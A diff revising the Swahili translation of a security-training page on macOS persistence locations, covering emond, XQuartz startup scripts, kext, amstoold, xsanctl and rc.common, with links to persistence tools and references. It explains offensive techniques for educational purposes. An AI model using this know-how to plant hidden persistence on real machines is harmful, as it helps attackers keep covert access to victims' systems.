+> Siwezi kupata component hii kwenye macOS yangu, kwa hivyo angalia writeup kwa maelezo zaidi
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>
 
-Iliyoanzishwa na Apple, **emond** ni utaratibu wa logging unaoonekana kuwa haujakamilishwa au huenda uliachwa, lakini bado unaweza kufikiwa. Ingawa haina manufaa makubwa kwa msimamizi wa Mac, service hii isiyojulikana sana inaweza kutumika kama njia fiche ya persistence kwa threat actors, na huenda isigunduliwe na admins wengi wa macOS.<sup>[[34]](#references)</sup>
+Ilianzishwa na Apple, **emond** ni utaratibu wa logging unaoonekana kuwa haujaendelezwa kikamilifu au huenda uliachwa, ingawa bado unapatikana. Ingawa si yenye manufaa hasa kwa msimamizi wa Mac, service hii isiyojulikana sana inaweza kutumika kama persistence method isiyoonekana kwa urahisi na threat actors, na huenda isibainike na macOS admins wengi.<sup>[[34]](#references)</sup>
 
-Kwa wanaofahamu uwepo wake, kutambua matumizi yoyote hasidi ya **emond** ni rahisi. LaunchDaemon ya mfumo ya service hii hutafuta scripts za kutekeleza kwenye directory moja. Ili kuchunguza hili, command ifuatayo inaweza kutumika:
+Kwa wanaojua kuwepo kwake, kutambua matumizi yoyote mabaya ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa ajili ya service hii hutafuta scripts za kutekeleza kwenye directory moja. Ili kukagua hili, command ifuatayo inaweza kutumika:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1524,7 +1524,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.g
 
 - **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
 - Root inahitajika
-- **Trigger**: Kwa kutumia XQuartz
+- **Trigger**: Kwa XQuartz
 
 #### Maelezo na Exploit
 
@@ -1533,7 +1533,7 @@ XQuartz **haisakinishwi tena kwenye macOS**, kwa hiyo ukitaka maelezo zaidi anga
 ### ~~kext~~
 
 > [!CAUTION]
-> Kusakinisha kext ni jambo gumu sana, hata ukiwa root, kiasi kwamba hii haichukuliwi kuwa mbinu ya kawaida ya sandbox-escape au persistence isipokuwa uwe na exploit.
+> Kusakinisha kext ni jambo gumu sana, hata ukiwa root, hivyo hii haichukuliwi kuwa mbinu ya kutoroka sandbox au persistence ya kivitendo isipokuwa uwe na exploit.
 
 #### Mahali
 
@@ -1565,7 +1565,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.g
 
 #### Maelezo na Exploitation
 
-Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii huku ikifichua XPC service... jambo ni kwamba binary hiyo haikuwepo, hivyo ungeweza kuweka kitu hapo na XPC service ilipoitwa, binary yako ingeitiwa.<sup>[[35]](#references)</sup>
+Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii huku ikifichua XPC service... jambo ni kwamba binary hiyo haikuwepo, kwa hiyo ungeweza kuweka kitu hapo na XPC service ilipoitwa binary yako ingeitwa.<sup>[[35]](#references)</sup>
 
 Siwezi tena kuipata kwenye macOS yangu.
 
@@ -1581,13 +1581,13 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.g
 
 #### Maelezo na exploit
 
-Inaonekana si jambo la kawaida sana kuendesha script hii, na hata sikuweza kuipata kwenye macOS yangu, kwa hiyo ukitaka maelezo zaidi angalia writeup.<sup>[[36]](#references)</sup>
+Inaonekana si jambo la kawaida sana kuendesha script hii na hata sikuweza kuipata kwenye macOS yangu, kwa hiyo ikiwa unataka maelezo zaidi angalia writeup.<sup>[[36]](#references)</sup>
 
 ### ~~/etc/rc.common~~
 
 > [!CAUTION] > **Hii haifanyi kazi katika matoleo ya kisasa ya MacOS**
 
-Pia inawezekana kuweka hapa **commands ambazo zitatekelezwa wakati wa kuanza.** Mfano wa script ya kawaida ya rc.common:
+Pia inawezekana kuweka hapa **commands zitakazo-execute wakati wa startup.** Mfano wa script ya kawaida ya rc.common:
 ```bash
 #
 # Common setup for startup scripts.
@@ -1680,7 +1680,7 @@ restart) RestartService ;;
 esac
 }
 ```
-## Mbinu na zana za persistence
+## Mbinu na zana za Persistence
 
 - [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
 - [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)
@@ -1688,39 +1688,39 @@ esac
 ## References
 
 - [1] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
-- [2] [Beyond the good ol' LaunchAgents - 1 - mafaili ya kuanzisha shell](https://theevilbit.github.io/beyond/beyond_0001/)
-- [3] [Beyond the good ol' LaunchAgents - 18 - X11 na XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
-- [4] [Beyond the good ol' LaunchAgents - 21 - Applications zilizofunguliwa tena](https://theevilbit.github.io/beyond/beyond_0021/)
-- [5] [Beyond the good ol' LaunchAgents - 20 - Mapendeleo ya Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
-- [6] [Beyond the good ol' LaunchAgents - 13 - Plugins za sauti](https://theevilbit.github.io/beyond/beyond_0013/)
-- [7] [Plugins za Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
-- [8] [Beyond the good ol' LaunchAgents - 12 - Plugins za QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
-- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook na LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
-- [10] [Beyond the good ol' LaunchAgents - 4 - kazi za cron](https://theevilbit.github.io/beyond/beyond_0004/)
-- [11] [Beyond the good ol' LaunchAgents - 2 - uanzishaji wa iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
-- [12] [Beyond the good ol' LaunchAgents - 7 - plugins za xbar](https://theevilbit.github.io/beyond/beyond_0007/)
-- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
-- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
-- [15] [Beyond the good ol' LaunchAgents - 3 - Vipengee vya Login](https://theevilbit.github.io/beyond/beyond_0003/)
-- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
-- [17] [Beyond the good ol' LaunchAgents - 24 - Vitendo vya Folda](https://theevilbit.github.io/beyond/beyond_0024/)
-- [18] [Vitendo vya Folda kwa Persistence kwenye macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
-- [19] [Beyond the good ol' LaunchAgents - 27 - Njia za mkato za Dock](https://theevilbit.github.io/beyond/beyond_0027/)
-- [20] [Beyond the good ol' LaunchAgents - 17 - Viteuzi vya Rangi](https://theevilbit.github.io/beyond/beyond_0017/)
-- [21] [Beyond the good ol' LaunchAgents - 26 - Plugins za Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
+- [2] [Zaidi ya LaunchAgents nzuri za zamani - 1 - faili za kuanzisha shell](https://theevilbit.github.io/beyond/beyond_0001/)
+- [3] [Zaidi ya LaunchAgents nzuri za zamani - 18 - X11 na XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
+- [4] [Zaidi ya LaunchAgents nzuri za zamani - 21 - Applications zilizofunguliwa tena](https://theevilbit.github.io/beyond/beyond_0021/)
+- [5] [Zaidi ya LaunchAgents nzuri za zamani - 20 - Mapendeleo ya Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
+- [6] [Zaidi ya LaunchAgents nzuri za zamani - 13 - Plugins za sauti](https://theevilbit.github.io/beyond/beyond_0013/)
+- [7] [Plug-ins za Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+- [8] [Zaidi ya LaunchAgents nzuri za zamani - 12 - Plugins za QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
+- [9] [Zaidi ya LaunchAgents nzuri za zamani - 22 - LoginHook na LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
+- [10] [Zaidi ya LaunchAgents nzuri za zamani - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
+- [11] [Zaidi ya LaunchAgents nzuri za zamani - 2 - uanzishaji wa iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
+- [12] [Zaidi ya LaunchAgents nzuri za zamani - 7 - plugins za xbar](https://theevilbit.github.io/beyond/beyond_0007/)
+- [13] [Zaidi ya LaunchAgents nzuri za zamani - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
+- [14] [Zaidi ya LaunchAgents nzuri za zamani - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
+- [15] [Zaidi ya LaunchAgents nzuri za zamani - 3 - Vipengee vya Login](https://theevilbit.github.io/beyond/beyond_0003/)
+- [16] [Zaidi ya LaunchAgents nzuri za zamani - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
+- [17] [Zaidi ya LaunchAgents nzuri za zamani - 24 - Vitendo vya folda](https://theevilbit.github.io/beyond/beyond_0024/)
+- [18] [Vitendo vya folda kwa Persistence kwenye macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
+- [19] [Zaidi ya LaunchAgents nzuri za zamani - 27 - Njia fupi za Dock](https://theevilbit.github.io/beyond/beyond_0027/)
+- [20] [Zaidi ya LaunchAgents nzuri za zamani - 17 - Vichagua rangi](https://theevilbit.github.io/beyond/beyond_0017/)
+- [21] [Zaidi ya LaunchAgents nzuri za zamani - 26 - Plugins za Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
 - [22] [Kuchanganua Persistence ya "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
-- [23] [Beyond the good ol' LaunchAgents - 16 - Kihifadhi-skrini](https://theevilbit.github.io/beyond/beyond_0016/)
-- [24] [Kuhifadhi Ufikiaji Wako: Vihifadhi-skrini kwa Persistence ya macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
-- [25] [Beyond the good ol' LaunchAgents - 11 - Waagizaji wa Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
-- [26] [Beyond the good ol' LaunchAgents - 9 - Pane ya Mapendeleo](https://theevilbit.github.io/beyond/beyond_0009/)
-- [27] [Beyond the good ol' LaunchAgents - 19 - Scripts za Mara kwa Mara](https://theevilbit.github.io/beyond/beyond_0019/)
-- [28] [Beyond the good ol' LaunchAgents - 5 - Moduli za Uthibitishaji Zinazoweza Kuunganishwa (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
-- [29] [Beyond the good ol' LaunchAgents - 28 - Plugins za Authorization](https://theevilbit.github.io/beyond/beyond_0028/)
-- [30] [Wizi Endelevu wa Credentials kwa kutumia Plugins za Authorization (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
-- [31] [Beyond the good ol' LaunchAgents - 30 - Faili la usanidi la man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
-- [32] [Beyond the good ol' LaunchAgents - 25 - Moduli za Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
-- [33] [Beyond the good ol' LaunchAgents - 31 - Mfumo wa ukaguzi wa BSM](https://theevilbit.github.io/beyond/beyond_0031/)
-- [34] [Beyond the good ol' LaunchAgents - 23 - emond, Daemon ya Kufuatilia Matukio](https://theevilbit.github.io/beyond/beyond_0023/)
-- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
-- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
+- [23] [Zaidi ya LaunchAgents nzuri za zamani - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
+- [24] [Kuhifadhi Ufikiaji Wako: Screensavers kwa Persistence ya macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
+- [25] [Zaidi ya LaunchAgents nzuri za zamani - 11 - Waingizaji wa Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
+- [26] [Zaidi ya LaunchAgents nzuri za zamani - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
+- [27] [Zaidi ya LaunchAgents nzuri za zamani - 19 - Scripts za mara kwa mara](https://theevilbit.github.io/beyond/beyond_0019/)
+- [28] [Zaidi ya LaunchAgents nzuri za zamani - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
+- [29] [Zaidi ya LaunchAgents nzuri za zamani - 28 - Plugins za Authorization](https://theevilbit.github.io/beyond/beyond_0028/)
+- [30] [Wizi wa Kudumu wa Credentials kwa kutumia Plugins za Authorization (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
+- [31] [Zaidi ya LaunchAgents nzuri za zamani - 30 - Faili ya usanidi ya man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
+- [32] [Zaidi ya LaunchAgents nzuri za zamani - 25 - modules za Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
+- [33] [Zaidi ya LaunchAgents nzuri za zamani - 31 - mfumo wa ukaguzi wa BSM](https://theevilbit.github.io/beyond/beyond_0031/)
+- [34] [Zaidi ya LaunchAgents nzuri za zamani - 23 - emond, Daemon ya Kufuatilia Matukio](https://theevilbit.github.io/beyond/beyond_0023/)
+- [35] [Zaidi ya LaunchAgents nzuri za zamani - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
+- [36] [Zaidi ya LaunchAgents nzuri za zamani - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
 {{#include ../banners/hacktricks-training.md}}
